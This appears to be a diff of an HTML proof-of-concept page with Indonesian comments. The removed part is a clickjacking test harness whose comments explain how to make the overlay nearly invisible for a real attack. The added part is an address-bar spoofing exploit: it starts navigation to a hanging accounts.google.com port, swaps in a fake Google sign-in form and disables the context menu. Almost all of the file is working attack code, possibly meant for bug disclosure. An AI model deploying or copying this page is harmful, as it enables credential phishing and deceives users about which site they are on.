@@ -1,90 +1,99 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <title>Proof of Concept: Clickjacking / UI Redressing Validation</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 30px;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Halaman Uji</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { width: 100%; height: 100%; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
 
-        /* 1. KANVAS UTAMA: Tempat bertumpuknya halaman target dan umpan */
-        .canvas-uji {
-            position: relative;
-            width: 700px;
-            height: 500px;
-            border: 2px solid #333;
-        }
+  /* ===== Halaman 1: polos, click here ===== */
+  #landing {
+    height: 100%;
+    display: flex; align-items: center; justify-content: center;
+    background: #fafafa;
+  }
+  #landing a {
+    font-size: 20px; color: #1a73e8; text-decoration: underline; cursor: pointer;
+  }
 
-        /* 2. LAPISAN BAWAH: Halaman internal Opera / Web Target */
-        iframe#targetFrame {
-            width: 100%;
-            height: 100%;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-            
-            /* TIPS AUDIT: 
-               - Set ke '0.5' saat merekam video PoC agar tim triase melihat tombol asli di bawahnya.
-               - Set ke '0.001' (hampir tidak terlihat) untuk membuktikan serangan di dunia nyata. */
-            opacity: 0.5; 
-        }
-
-        /* 3. LAPISAN ATAS: Antarmuka palsu yang dilihat oleh korban */
-        .umpan-visual {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 2;
-            
-            /* PENTING: Mengizinkan klik menembus lapisan HTML ini dan mengenai iframe */
-            pointer-events: none; 
-            
-            background-color: #ffffff;
-            padding: 30px;
-            box-sizing: border-box;
-        }
-
-        /* Tombol Palsu untuk memancing jari/kursor korban */
-        .tombol-palsu {
-            /* KOORDINAT: Sesuaikan 'margin' di bawah agar posisi tombol hijau ini 
-               pas di atas tombol sensitif (misal: tombol 'Allow' atau 'Delete') di dalam iframe */
-            margin-top: 150px; 
-            margin-left: 200px;
-            
-            padding: 15px 30px;
-            background-color: #28a745;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            border: none;
-            border-radius: 5px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-    </style>
+  /* ===== Halaman 2: form palsu Google (muncul setelah klik) ===== */
+  #fake {
+    display: none;
+    height: 100%; background: #fff;
+    padding-top: 90px;
+  }
+  .card {
+    width: 448px; max-width: 92%;
+    margin: 0 auto;
+    border: 1px solid #dadce0; border-radius: 8px;
+    padding: 48px 40px;
+  }
+  .logo { display: flex; justify-content: center; margin-bottom: 16px; }
+  h1 { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
+  p.sub { text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 32px; }
+  .input {
+    width: 100%; height: 54px; border: 1px solid #dadce0;
+    border-radius: 4px; padding: 0 16px; font-size: 16px;
+    outline: none; margin-bottom: 16px;
+  }
+  .input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
+  .row { display: flex; justify-content: space-between; align-items: center; margin-top: 24px; }
+  a.link { color: #1a73e8; font-size: 14px; text-decoration: none; }
+  button.next {
+    background: #1a73e8; color: #fff; border: none;
+    padding: 10px 24px; border-radius: 4px; font-size: 14px;
+    font-weight: 500; cursor: pointer;
+  }
+</style>
 </head>
 <body>
 
-    <h2>Alat Uji Validasi Kerentanan UI Frame</h2>
-    <p>Gunakan lab mandiri ini untuk membuktikan apakah komponen target dapat dibingkai (framed) tanpa proteksi anti-clickjacking.</p>
+  <!-- Halaman polos -->
+  <div id="landing">
+    <a id="go">Click here</a>
+  </div>
 
-    <div class="canvas-uji">
-        <!-- MASUKKAN TARGET DI SINI:
-             Ganti src dengan URL sensitif Opera atau domain target yang Anda temukan rentan -->
-        <iframe id="targetFrame" src="https://example.com"></iframe>
-
-        <!-- Lapisan Rekayasa Sosial Visual -->
-        <div class="umpan-visual">
-            <h3>Pemberitahuan Pembaruan Sistem</h3>
-            <p>Aplikasi Anda memerlukan pembaruan optimasi ruang penyimpanan. Silakan klik tombol di bawah untuk melanjutkan:</p>
-            
-            <button class="tombol-palsu">OPTIMALKAN SEKARANG</button>
-        </div>
+  <!-- Form palsu: hidden, di-reveal saat klik -->
+  <div id="fake">
+    <div class="card">
+      <div class="logo">
+        <svg width="92" height="30" viewBox="0 0 272 92"><path fill="#EA4335" d="M115 43c0-18 15-32 33-32 18 0 33 14 33 32s-15 32-33 32c-18 0-33-14-33-32zm18 0c0 9 7 16 15 16s15-7 15-16-7-16-15-16-15 7-15 16z"/><path fill="#FBBC05" d="M59 43c0-18 15-32 33-32 18 0 33 14 33 32s-15 32-33 32c-18 0-33-14-33-32zm18 0c0 9 7 16 15 16s15-7 15-16-7-16-15-16-15 7-15 16z"/><path fill="#4285F4" d="M115 8v63h17V8h-17zm9 39l-11 9 26 23h22L124 47z"/><path fill="#34A853" d="M212 8v63h17V26h17l3-18h-20V2h-17v6z"/><path fill="#EA4335" d="M255 43c0-18 15-32 33-32s33 14 33 32-15 32-33 32-33-14-33-32zm18 0c0 9 7 16 15 16s15-7 15-16-7-16-15-16-15 7-15 16z"/></svg>
+      </div>
+      <h1>Masuk</h1>
+      <p class="sub">Gunakan Akun Google Anda</p>
+      <input class="input" type="email" placeholder="Email atau ponsel" id="email" autofocus>
+      <a class="link" href="#">Lupa email?</a>
+      <div class="row">
+        <a class="link" href="#">Buat akun</a>
+        <button class="next">Lanjutkan</button>
+      </div>
     </div>
+  </div>
 
+<script>
+  const TARGET = 'https://accounts.google.com:1234/v3/signin/identifier?flowName=GlifWebSignIn';
+
+  document.getElementById('go').addEventListener('click', (e) => {
+    e.preventDefault();
+
+    // 1. Mulai navigasi DULU — address bar langsung berubah ke accounts.google.com:1234
+    //    (karena port 1234 hang, halaman baru tidak akan selesai di-render,
+    //     sehingga dokumen lama ini tetap hidup dan tampil)
+    location.href = TARGET;
+
+    // 2. Segera setelah navigasi dimulai, swap konten ke form palsu.
+    //    Dokumen lama masih tampil selama loading, jadi user melihat
+    //    form "Google" padahal address bar sudah accounts.google.com:1234.
+    setTimeout(() => {
+      document.getElementById('landing').style.display = 'none';
+      document.getElementById('fake').style.display = 'block';
+      document.getElementById('email').focus();
+    }, 50);
+  });
+
+  document.addEventListener('contextmenu', e => e.preventDefault());
+</script>
 </body>
 </html>
